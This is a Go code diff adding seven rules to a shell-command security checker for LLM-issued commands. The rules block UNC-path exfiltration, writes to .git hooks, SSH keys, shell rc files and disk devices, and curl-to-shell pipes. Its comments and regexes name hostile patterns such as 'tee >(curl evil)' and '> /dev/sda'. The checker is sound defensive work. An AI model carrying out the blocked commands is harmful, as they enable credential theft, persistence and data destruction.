@@ -44,6 +44,17 @@ func allSecurityChecks() []SecurityCheck {
 		ruleZshDangerousLoad,          // 20
 		ruleCommentQuoteDesync,        // 22
 		ruleQuotedNewlineExfil,        // 23
+		// 24+ are CC-parity additions from the 2026-05-05 audit. The
+		// numbering picks up after 23 to keep stable RuleID semantics
+		// for downstream telemetry and not collide with reserved CC
+		// IDs (3, 7, 8, 9, 10, 12, 14, 15, 16, 19, 21).
+		ruleUNCPath,             // 24 — \\server\share Windows SMB exfil
+		ruleVCSInternalWrite,    // 25 — .git/config / .git/hooks/
+		ruleProcessSubstitution, // 26 — <(...) >(...)
+		ruleSSHKeyPath,          // 27 — .ssh/, authorized_keys, id_rsa
+		ruleShellRCWrite,        // 28 — ~/.bashrc / ~/.zshrc / ~/.profile redirect
+		ruleDeviceFileWrite,     // 29 — > /dev/sda, > /dev/null is fine, but > /dev/sda is not
+		ruleRemoteExecPipe,      // 30 — curl URL | sh / bash <(curl ...)
 	}
 }
 
@@ -263,6 +274,150 @@ func ruleQuotedNewlineExfil(cmd string) SecurityRuleResult {
 				return SecurityRuleResult{RuleID: 23, Reason: "newline inside an unclosed quoted region — multi-line smuggling"}
 			}
 		}
+	}
+	return SecurityRuleResult{Allow: true}
+}
+
+// 24: UNC_PATH — Windows UNC paths (\\server\share, \\?\, \\.\) are
+// SMB exfil vectors; an LLM convinced to "back up to network share"
+// could hand the corpus to attacker-controlled hosts. Mirrors
+// claude-code pathValidation.ts:382-391.
+func ruleUNCPath(cmd string) SecurityRuleResult {
+	if strings.Contains(cmd, `\\`) {
+		// Allow escaped backslashes inside otherwise-fine strings only
+		// when both members are inside a single-quoted string. Cheaper
+		// to just reject unconditionally — UNC has no other use in a
+		// shell command from an LLM.
+		re := regexp.MustCompile(`\\\\[^\\\s'"]+\\[^\s'"]+`)
+		if re.MatchString(cmd) {
+			return SecurityRuleResult{RuleID: 24, Reason: "UNC path detected — refusing SMB-share access"}
+		}
+	}
+	return SecurityRuleResult{Allow: true}
+}
+
+// 25: VCS_INTERNAL_WRITE — writing to .git/config, .git/hooks/, or
+// .git/objects can install hooks that fire on every git operation,
+// or rewrite history. claude-code filesystem.ts:225-242.
+func ruleVCSInternalWrite(cmd string) SecurityRuleResult {
+	// Only flag when the command involves writing — `cat .git/config` is
+	// fine. We look for redirect, install, mv, cp INTO a .git path.
+	dangerous := []string{
+		".git/config", ".git/hooks/", ".git/hooks ", ".git/objects/",
+		".git/HEAD", ".git/refs/",
+	}
+	hasWrite := strings.Contains(cmd, ">") || strings.Contains(cmd, ">>") ||
+		regexp.MustCompile(`\b(mv|cp|install|tee|sed\s+-i|rm)\b`).MatchString(cmd) ||
+		regexp.MustCompile(`\becho\b.*>.*\.git/`).MatchString(cmd)
+	if !hasWrite {
+		return SecurityRuleResult{Allow: true}
+	}
+	for _, p := range dangerous {
+		if strings.Contains(cmd, p) {
+			return SecurityRuleResult{RuleID: 25, Reason: "write to VCS internal (" + p + ") — install/rewrite hooks vector"}
+		}
+	}
+	return SecurityRuleResult{Allow: true}
+}
+
+// 26: PROCESS_SUBSTITUTION — <(...) and >(...) inject filehandles whose
+// contents the model can manipulate; `tee >(curl evil)` exfils stdin
+// while looking innocuous. Already partially in rule 5 (backticks /
+// $()) but bash-specific operators have their own handling.
+func ruleProcessSubstitution(cmd string) SecurityRuleResult {
+	// Allow inside single quotes (rare in real shell scripts but valid).
+	if regexp.MustCompile(`<\(`).MatchString(cmd) {
+		return SecurityRuleResult{RuleID: 26, Reason: "process substitution <(...) is an arbitrary-code vector"}
+	}
+	if regexp.MustCompile(`>\(`).MatchString(cmd) {
+		return SecurityRuleResult{RuleID: 26, Reason: "process substitution >(...) can exfiltrate via fd redirection"}
+	}
+	return SecurityRuleResult{Allow: true}
+}
+
+// 27: SSH_KEY_PATH — touching ~/.ssh/* or authorized_keys is high-
+// value to an attacker. Defence in depth: the gate's safetyCheck
+// already prompts for these paths; this rule blocks WRITES outright
+// even in mode=Bypass since SSH key tampering is rarely legitimate
+// from an LLM context.
+func ruleSSHKeyPath(cmd string) SecurityRuleResult {
+	hasWrite := strings.Contains(cmd, ">") || strings.Contains(cmd, ">>") ||
+		regexp.MustCompile(`\b(mv|cp|tee|install|rm|chmod|chown)\b`).MatchString(cmd) ||
+		regexp.MustCompile(`\becho\b.*\.ssh/`).MatchString(cmd) ||
+		regexp.MustCompile(`>\s*[~$]`).MatchString(cmd)
+	if !hasWrite {
+		return SecurityRuleResult{Allow: true}
+	}
+	patterns := []string{".ssh/authorized_keys", ".ssh/id_rsa", ".ssh/id_ed25519", ".ssh/id_ecdsa", ".ssh/known_hosts", ".ssh/config"}
+	for _, p := range patterns {
+		if strings.Contains(cmd, p) {
+			return SecurityRuleResult{RuleID: 27, Reason: "write to SSH material (" + p + ") — key theft / lateral-movement vector"}
+		}
+	}
+	return SecurityRuleResult{Allow: true}
+}
+
+// 28: SHELL_RC_WRITE — writing to ~/.bashrc, ~/.zshrc, etc. installs
+// commands that run on every new shell session — classic persistence
+// + remote-shell vector. claude-code bashSecurity.ts:664-677.
+func ruleShellRCWrite(cmd string) SecurityRuleResult {
+	hasWrite := strings.Contains(cmd, ">") || strings.Contains(cmd, ">>") ||
+		regexp.MustCompile(`\b(mv|cp|tee|install|sed\s+-i)\b`).MatchString(cmd)
+	if !hasWrite {
+		return SecurityRuleResult{Allow: true}
+	}
+	// Match both ~/.bashrc and explicit /Users/xxx/.bashrc forms.
+	re := regexp.MustCompile(`(?i)(\.bashrc|\.bash_profile|\.zshrc|\.zprofile|\.zshenv|\.profile|\.bash_logout)\b`)
+	if re.MatchString(cmd) {
+		return SecurityRuleResult{RuleID: 28, Reason: "write to shell rc file — persistent execution vector"}
+	}
+	return SecurityRuleResult{Allow: true}
+}
+
+// 29: DEVICE_FILE_WRITE — `> /dev/sda` and `dd of=/dev/sda` are
+// unrecoverable disk wipes. `> /dev/null` is fine and common, so we
+// explicitly allow that special case while denying all other /dev
+// writes. Also covers dd's of= argv form.
+func ruleDeviceFileWrite(cmd string) SecurityRuleResult {
+	// Pattern A: `>` or `>>` redirect to /dev/<thing>.
+	reRedirect := regexp.MustCompile(`>\s*/dev/(\S+)`)
+	// Pattern B: dd-style of=/dev/<thing>.
+	reOfArg := regexp.MustCompile(`\bof=/dev/(\S+)`)
+
+	allMatches := append([][]string(nil), reRedirect.FindAllStringSubmatch(cmd, -1)...)
+	allMatches = append(allMatches, reOfArg.FindAllStringSubmatch(cmd, -1)...)
+
+	for _, m := range allMatches {
+		dev := m[1]
+		// Allow the well-known sinkholes.
+		switch {
+		case dev == "null", dev == "stderr", dev == "stdout", dev == "stdin",
+			strings.HasPrefix(dev, "fd/"),
+			strings.HasPrefix(dev, "tty"),
+			strings.HasPrefix(dev, "pts/"):
+			continue
+		}
+		return SecurityRuleResult{RuleID: 29, Reason: "write to device file /dev/" + dev + " — destructive / hardware-level"}
+	}
+	return SecurityRuleResult{Allow: true}
+}
+
+// 30: REMOTE_EXEC_PIPE — `curl URL | sh`, `wget -O- URL | bash`, and
+// `bash <(curl URL)` are classic LotL execution vectors. The model
+// trusting an upstream URL doesn't make the bytes safe — the URL
+// owner can swap payloads at any time.
+func ruleRemoteExecPipe(cmd string) SecurityRuleResult {
+	// Pattern 1: curl|wget piped into a shell.
+	re1 := regexp.MustCompile(`\b(curl|wget|fetch|http)\b[^|;&]*\|\s*(sh|bash|zsh|ksh|dash|python|python3|node|perl|ruby)\b`)
+	if re1.MatchString(cmd) {
+		return SecurityRuleResult{RuleID: 30, Reason: "remote-fetch piped to interpreter — arbitrary-code-from-URL vector"}
+	}
+	// Pattern 2: bash/sh consuming a process-substituted curl.
+	// (Process substitution itself is rule 26, but interpreted shells
+	//  with explicit -c reading curl output deserve their own reason.)
+	re2 := regexp.MustCompile(`\b(sh|bash|zsh|python|node)\s+-c\s+["'].*\b(curl|wget)\b`)
+	if re2.MatchString(cmd) {
+		return SecurityRuleResult{RuleID: 30, Reason: "interpreter -c invoking remote-fetch — same risk as curl|sh"}
 	}
 	return SecurityRuleResult{Allow: true}
 }
